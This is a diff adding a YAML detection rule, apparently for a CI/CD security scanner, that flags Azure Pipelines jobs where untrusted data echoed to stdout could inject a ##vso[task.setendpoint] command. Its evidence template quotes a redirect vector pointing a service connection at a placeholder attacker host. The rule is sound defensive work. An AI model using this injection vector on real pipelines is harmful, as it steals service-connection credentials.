@@ -1,0 +1,30 @@
+id: cat-13/setendpoint-connection-redirect
+scenario_id: cat-13/03
+title: "Injected ##vso[task.setendpoint] redirects a live service connection or captures its token"
+subject: pipeline
+severity: critical
+confidence: high
+description: >
+  An injected ##vso[task.setendpoint] line mutates a service connection
+  in-flight — redirecting its URL to an attacker host or overwriting its
+  authParameter. A later authenticated task (AzureCLI, Docker login,
+  kubectl) now ships the connection's credential to the attacker, or
+  operates against the attacker's endpoint. The connection GUID is
+  discoverable from pipeline YAML, build logs, or the Service Endpoints
+  REST API. No misconfiguration required.
+
+where:
+  all_of:
+    - echoes_untrusted_to_stdout == true
+    - uses_service_connection_later_same_job == true
+
+evidence:
+  - "Pipeline {{ _provenance.pipeline_name }}: step {{ echo_step }} echoes {{ untrusted_source }} to stdout"
+  - "Service connection {{ connection_name }} ({{ connection_id }}) used by later step {{ connection_step }}"
+  - "Redirect vector: ##vso[task.setendpoint id=<guid>;field=url]<attacker-host>"
+
+remediation_hint: >
+  Never echo attacker-controlled data to stdout in a job that uses service
+  connections. Isolate untrusted-echo steps in a separate job from
+  authenticated tasks. Redirect untrusted output to files. Monitor for
+  unexpected task.setendpoint commands in build logs.
